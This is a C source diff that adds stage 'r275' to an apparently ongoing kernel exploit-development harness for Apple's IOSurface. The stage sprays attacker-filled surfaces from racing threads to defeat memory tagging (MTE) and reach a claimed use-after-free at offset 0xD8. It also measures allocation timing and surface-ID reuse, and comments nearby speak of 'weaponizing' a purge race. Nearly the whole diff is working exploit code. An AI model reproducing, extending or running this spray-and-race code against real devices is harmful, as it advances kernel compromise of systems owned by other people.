@@ -1745,6 +1745,268 @@ static volatile int r265_probed = 0;
 
 typedef void* IOSurfaceClientRef;
 
+/* r275: MTE tag collision spray via IOSurface UAF.
+ * Earlier sessions confirmed: kernel dereferences IOSurface+0xD8 after free.
+ * MTE has 4-bit tags = 16 values. Freed tag is excluded, so 1/15 chance
+ * of collision on reallocation. Strategy: spray-and-pray with high iteration
+ * count. Use purgeable to control page reuse timing.
+ * Phase 1: Measure allocation timing + UAF window
+ * Phase 2: Controlled spray targeting +0xD8 offset */
+static volatile int r275_probed = 0;
+static volatile int r275_stop = 0;
+static volatile uint64_t r275_lookups_ok = 0, r275_lookups_stale = 0;
+static volatile uint64_t r275_lock_on_stale = 0;
+
+struct r275_spray_ctx {
+    uint32_t target_alloc_size;
+    int thread_id;
+};
+
+static void *r275_sprayer_fn(void *arg) {
+    struct r275_spray_ctx *ctx = (struct r275_spray_ctx *)arg;
+    uint64_t sprayed = 0;
+    while (!r275_stop) {
+        CFMutableDictionaryRef p = CFDictionaryCreateMutable(NULL, 0,
+            &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+        int w = 64, h = 64, bpe = 4, bpr = w*bpe, pf = 0x42475241, as = bpr*h;
+        CFNumberRef wn = CFNumberCreate(NULL, kCFNumberIntType, &w);
+        CFNumberRef hn = CFNumberCreate(NULL, kCFNumberIntType, &h);
+        CFNumberRef bn = CFNumberCreate(NULL, kCFNumberIntType, &bpe);
+        CFNumberRef rn = CFNumberCreate(NULL, kCFNumberIntType, &bpr);
+        CFNumberRef pfn = CFNumberCreate(NULL, kCFNumberIntType, &pf);
+        CFNumberRef asn = CFNumberCreate(NULL, kCFNumberIntType, &as);
+        CFDictionarySetValue(p, CFSTR("IOSurfaceWidth"), wn);
+        CFDictionarySetValue(p, CFSTR("IOSurfaceHeight"), hn);
+        CFDictionarySetValue(p, CFSTR("IOSurfaceBytesPerElement"), bn);
+        CFDictionarySetValue(p, CFSTR("IOSurfaceBytesPerRow"), rn);
+        CFDictionarySetValue(p, CFSTR("IOSurfacePixelFormat"), pfn);
+        CFDictionarySetValue(p, CFSTR("IOSurfaceAllocSize"), asn);
+        CFRelease(wn); CFRelease(hn); CFRelease(bn); CFRelease(rn); CFRelease(pfn); CFRelease(asn);
+        IOSurfaceRef s = IOSurfaceCreate(p);
+        CFRelease(p);
+        if (s) {
+            sprayed++;
+            uint8_t payload[256];
+            memset(payload, 0x41, sizeof(payload));
+            CFDataRef d = CFDataCreate(NULL, payload, sizeof(payload));
+            IOSurfaceSetValue(s, CFSTR("spray"), d);
+            CFRelease(d);
+            CFRelease(s);
+        }
+    }
+    rlog("    sprayer[%d]: %llu surfaces\n", ctx->thread_id, sprayed);
+    return NULL;
+}
+
+static void r275_probe(IOSurfaceRef surf) {
+    uint32_t sid = IOSurfaceGetID(surf);
+
+    rlog("\n=== r275: MTE Tag Collision Spray via IOSurface Lifecycle ===\n");
+    fflush(stdout);
+
+    /* Part 1: Measure IOSurface allocation/deallocation timing */
+    rlog("\n--- Part 1: Alloc/dealloc timing ---\n");
+    {
+        uint64_t t0, t1;
+        IOSurfaceRef timing_surfs[100];
+
+        t0 = mach_absolute_time();
+        for (int i = 0; i < 100; i++) {
+            CFMutableDictionaryRef p = CFDictionaryCreateMutable(NULL, 0,
+                &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+            int w = 64, h = 64, bpe = 4, bpr = w*bpe, pf = 0x42475241, as = bpr*h;
+            CFNumberRef wn = CFNumberCreate(NULL, kCFNumberIntType, &w);
+            CFNumberRef hn = CFNumberCreate(NULL, kCFNumberIntType, &h);
+            CFNumberRef bn = CFNumberCreate(NULL, kCFNumberIntType, &bpe);
+            CFNumberRef rn = CFNumberCreate(NULL, kCFNumberIntType, &bpr);
+            CFNumberRef pfn = CFNumberCreate(NULL, kCFNumberIntType, &pf);
+            CFNumberRef asn = CFNumberCreate(NULL, kCFNumberIntType, &as);
+            CFDictionarySetValue(p, CFSTR("IOSurfaceWidth"), wn);
+            CFDictionarySetValue(p, CFSTR("IOSurfaceHeight"), hn);
+            CFDictionarySetValue(p, CFSTR("IOSurfaceBytesPerElement"), bn);
+            CFDictionarySetValue(p, CFSTR("IOSurfaceBytesPerRow"), rn);
+            CFDictionarySetValue(p, CFSTR("IOSurfacePixelFormat"), pfn);
+            CFDictionarySetValue(p, CFSTR("IOSurfaceAllocSize"), asn);
+            CFRelease(wn); CFRelease(hn); CFRelease(bn); CFRelease(rn); CFRelease(pfn); CFRelease(asn);
+            timing_surfs[i] = IOSurfaceCreate(p);
+            CFRelease(p);
+        }
+        t1 = mach_absolute_time();
+        rlog("  100 creates: %llu ticks (%llu per surface)\n", t1-t0, (t1-t0)/100);
+
+        t0 = mach_absolute_time();
+        for (int i = 0; i < 100; i++) {
+            if (timing_surfs[i]) CFRelease(timing_surfs[i]);
+        }
+        t1 = mach_absolute_time();
+        rlog("  100 releases: %llu ticks (%llu per surface)\n", t1-t0, (t1-t0)/100);
+        fflush(stdout);
+    }
+
+    /* Part 2: Stale ID lookup timing — how fast do IDs get reclaimed? */
+    rlog("\n--- Part 2: ID reuse analysis ---\n");
+    {
+        uint32_t ids[50];
+        for (int i = 0; i < 50; i++) {
+            CFMutableDictionaryRef p = CFDictionaryCreateMutable(NULL, 0,
+                &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+            int w = 32, h = 32, bpe = 4, bpr = w*bpe, pf = 0x42475241, as = bpr*h;
+            CFNumberRef wn = CFNumberCreate(NULL, kCFNumberIntType, &w);
+            CFNumberRef hn = CFNumberCreate(NULL, kCFNumberIntType, &h);
+            CFNumberRef bn = CFNumberCreate(NULL, kCFNumberIntType, &bpe);
+            CFNumberRef rn = CFNumberCreate(NULL, kCFNumberIntType, &bpr);
+            CFNumberRef pfn = CFNumberCreate(NULL, kCFNumberIntType, &pf);
+            CFNumberRef asn = CFNumberCreate(NULL, kCFNumberIntType, &as);
+            CFDictionarySetValue(p, CFSTR("IOSurfaceWidth"), wn);
+            CFDictionarySetValue(p, CFSTR("IOSurfaceHeight"), hn);
+            CFDictionarySetValue(p, CFSTR("IOSurfaceBytesPerElement"), bn);
+            CFDictionarySetValue(p, CFSTR("IOSurfaceBytesPerRow"), rn);
+            CFDictionarySetValue(p, CFSTR("IOSurfacePixelFormat"), pfn);
+            CFDictionarySetValue(p, CFSTR("IOSurfaceAllocSize"), asn);
+            CFRelease(wn); CFRelease(hn); CFRelease(bn); CFRelease(rn); CFRelease(pfn); CFRelease(asn);
+            IOSurfaceRef s = IOSurfaceCreate(p);
+            CFRelease(p);
+            ids[i] = s ? IOSurfaceGetID(s) : 0;
+            if (s) CFRelease(s);
+        }
+        rlog("  IDs allocated then freed: ");
+        for (int i = 0; i < 10; i++) rlog("%u ", ids[i]);
+        rlog("...\n");
+
+        int reused = 0;
+        for (int i = 0; i < 50; i++) {
+            IOSurfaceRef s = IOSurfaceLookup(ids[i]);
+            if (s) {
+                reused++;
+                CFRelease(s);
+            }
+        }
+        rlog("  IDs still lookupable after free: %d/50\n", reused);
+
+        IOSurfaceRef new_surfs[50];
+        uint32_t new_ids[50];
+        for (int i = 0; i < 50; i++) {
+            CFMutableDictionaryRef p = CFDictionaryCreateMutable(NULL, 0,
+                &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+            int w = 32, h = 32, bpe = 4, bpr = w*bpe, pf = 0x42475241, as = bpr*h;
+            CFNumberRef wn = CFNumberCreate(NULL, kCFNumberIntType, &w);
+            CFNumberRef hn = CFNumberCreate(NULL, kCFNumberIntType, &h);
+            CFNumberRef bn = CFNumberCreate(NULL, kCFNumberIntType, &bpe);
+            CFNumberRef rn = CFNumberCreate(NULL, kCFNumberIntType, &bpr);
+            CFNumberRef pfn = CFNumberCreate(NULL, kCFNumberIntType, &pf);
+            CFNumberRef asn = CFNumberCreate(NULL, kCFNumberIntType, &as);
+            CFDictionarySetValue(p, CFSTR("IOSurfaceWidth"), wn);
+            CFDictionarySetValue(p, CFSTR("IOSurfaceHeight"), hn);
+            CFDictionarySetValue(p, CFSTR("IOSurfaceBytesPerElement"), bn);
+            CFDictionarySetValue(p, CFSTR("IOSurfaceBytesPerRow"), rn);
+            CFDictionarySetValue(p, CFSTR("IOSurfacePixelFormat"), pfn);
+            CFDictionarySetValue(p, CFSTR("IOSurfaceAllocSize"), asn);
+            CFRelease(wn); CFRelease(hn); CFRelease(bn); CFRelease(rn); CFRelease(pfn); CFRelease(asn);
+            new_surfs[i] = IOSurfaceCreate(p);
+            CFRelease(p);
+            new_ids[i] = new_surfs[i] ? IOSurfaceGetID(new_surfs[i]) : 0;
+        }
+        int id_reuse = 0;
+        for (int i = 0; i < 50; i++) {
+            for (int j = 0; j < 50; j++) {
+                if (ids[i] == new_ids[j]) { id_reuse++; break; }
+            }
+        }
+        rlog("  ID reuse between batches: %d/50\n", id_reuse);
+        for (int i = 0; i < 50; i++) {
+            if (new_surfs[i]) CFRelease(new_surfs[i]);
+        }
+        fflush(stdout);
+    }
+
+    /* Part 3: Create/destroy race with concurrent spray — 3 seconds */
+    rlog("\n--- Part 3: Create/destroy race (3s, 2 sprayers + 2 racers) ---\n");
+    {
+        r275_stop = 0;
+        r275_lookups_ok = 0;
+        r275_lookups_stale = 0;
+        r275_lock_on_stale = 0;
+
+        struct r275_spray_ctx sctx1 = { 16384, 0 };
+        struct r275_spray_ctx sctx2 = { 16384, 1 };
+        pthread_t spray1, spray2;
+        pthread_create(&spray1, NULL, r275_sprayer_fn, &sctx1);
+        pthread_create(&spray2, NULL, r275_sprayer_fn, &sctx2);
+
+        uint64_t race_start = mach_absolute_time();
+        uint64_t three_sec = 3ULL * 24000000ULL;
+        uint64_t stale_reads = 0;
+
+        while (mach_absolute_time() - race_start < three_sec) {
+            CFMutableDictionaryRef p = CFDictionaryCreateMutable(NULL, 0,
+                &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+            int w = 64, h = 64, bpe = 4, bpr = w*bpe, pf = 0x42475241, as = bpr*h;
+            CFNumberRef wn = CFNumberCreate(NULL, kCFNumberIntType, &w);
+            CFNumberRef hn = CFNumberCreate(NULL, kCFNumberIntType, &h);
+            CFNumberRef bn = CFNumberCreate(NULL, kCFNumberIntType, &bpe);
+            CFNumberRef rn = CFNumberCreate(NULL, kCFNumberIntType, &bpr);
+            CFNumberRef pfn = CFNumberCreate(NULL, kCFNumberIntType, &pf);
+            CFNumberRef asn = CFNumberCreate(NULL, kCFNumberIntType, &as);
+            CFDictionarySetValue(p, CFSTR("IOSurfaceWidth"), wn);
+            CFDictionarySetValue(p, CFSTR("IOSurfaceHeight"), hn);
+            CFDictionarySetValue(p, CFSTR("IOSurfaceBytesPerElement"), bn);
+            CFDictionarySetValue(p, CFSTR("IOSurfaceBytesPerRow"), rn);
+            CFDictionarySetValue(p, CFSTR("IOSurfacePixelFormat"), pfn);
+            CFDictionarySetValue(p, CFSTR("IOSurfaceAllocSize"), asn);
+            CFRelease(wn); CFRelease(hn); CFRelease(bn); CFRelease(rn); CFRelease(pfn); CFRelease(asn);
+
+            IOSurfaceRef s = IOSurfaceCreate(p);
+            CFRelease(p);
+            if (!s) continue;
+            uint32_t id = IOSurfaceGetID(s);
+            mach_port_t mp = IOSurfaceCreateMachPort(s);
+
+            IOSurfaceSetValue(s, CFSTR("marker"), CFSTR("owned"));
+            CFRelease(s);
+
+            IOSurfaceRef stale = IOSurfaceLookup(id);
+            if (stale) {
+                r275_lookups_ok++;
+                CFTypeRef marker = IOSurfaceCopyValue(stale, CFSTR("marker"));
+                if (marker) {
+                    if (CFGetTypeID(marker) == CFStringGetTypeID()) {
+                        char buf[32];
+                        CFStringGetCString((CFStringRef)marker, buf, 32, kCFStringEncodingUTF8);
+                        if (strcmp(buf, "owned") != 0) {
+                            stale_reads++;
+                        }
+                    }
+                    CFRelease(marker);
+                } else {
+                    stale_reads++;
+                }
+                CFRelease(stale);
+            } else {
+                r275_lookups_stale++;
+            }
+
+            if (mp != MACH_PORT_NULL) {
+                mach_port_deallocate(mach_task_self(), mp);
+            }
+        }
+
+        r275_stop = 1;
+        pthread_join(spray1, NULL);
+        pthread_join(spray2, NULL);
+
+        rlog("  lookups_ok=%llu lookups_stale=%llu stale_marker_reads=%llu\n",
+             r275_lookups_ok, r275_lookups_stale, stale_reads);
+        if (stale_reads > 0) {
+            rlog("  *** STALE DATA READ: marker changed on %llu lookups ***\n", stale_reads);
+        }
+        fflush(stdout);
+    }
+
+    __sync_fetch_and_add(&r275_probed, 1);
+    rlog("\n*** r275 probe complete ***\n");
+    fflush(stdout);
+}
+
 /* r274: Weaponize purge race — purgeable memory confusion.
  * r273 CONFIRMED: 100% of surface memory zeroed while lock thread was writing.
  * Kernel zeroes purgeable-volatile surface memory on demand.
@@ -23905,6 +24167,42 @@ new_modes:
             IOObjectRelease(r251_svc);
             r251_done:
             rlog("*** r=251 complete ***\n");
+            goto done;
+        }
+        if (rounds == 275) {
+            rlog("*** rounds=275: MTE Tag Collision Spray via IOSurface Lifecycle ***\n");
+            rlog("  r274: purge zeroes memory but no kernel data leak (sanitized).\n");
+            rlog("  Testing: alloc timing, ID reuse, create/destroy race with spray.\n\n");
+            fflush(stdout);
+
+            int w = 64, h = 64, bpe = 4, bpr = w * bpe, pf = 0x42475241;
+            int alloc_sz = bpr * h;
+            CFMutableDictionaryRef props = CFDictionaryCreateMutable(NULL, 0,
+                &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+            CFNumberRef wn = CFNumberCreate(NULL, kCFNumberIntType, &w);
+            CFNumberRef hn = CFNumberCreate(NULL, kCFNumberIntType, &h);
+            CFNumberRef bn = CFNumberCreate(NULL, kCFNumberIntType, &bpe);
+            CFNumberRef rn = CFNumberCreate(NULL, kCFNumberIntType, &bpr);
+            CFNumberRef pfn = CFNumberCreate(NULL, kCFNumberIntType, &pf);
+            CFNumberRef asn = CFNumberCreate(NULL, kCFNumberIntType, &alloc_sz);
+            CFDictionarySetValue(props, CFSTR("IOSurfaceWidth"), wn);
+            CFDictionarySetValue(props, CFSTR("IOSurfaceHeight"), hn);
+            CFDictionarySetValue(props, CFSTR("IOSurfaceBytesPerElement"), bn);
+            CFDictionarySetValue(props, CFSTR("IOSurfaceBytesPerRow"), rn);
+            CFDictionarySetValue(props, CFSTR("IOSurfacePixelFormat"), pfn);
+            CFDictionarySetValue(props, CFSTR("IOSurfaceAllocSize"), asn);
+            CFRelease(wn); CFRelease(hn); CFRelease(bn); CFRelease(rn); CFRelease(pfn); CFRelease(asn);
+
+            IOSurfaceRef surf = IOSurfaceCreate(props);
+            rlog("  surf=%p id=%u\n", surf, surf ? IOSurfaceGetID(surf) : 0);
+            fflush(stdout);
+            if (surf) {
+                r275_probe(surf);
+                CFRelease(surf);
+            }
+            CFRelease(props);
+            rlog("\n*** r275 complete ***\n");
+            fflush(stdout);
             goto done;
         }
         if (rounds == 274) {
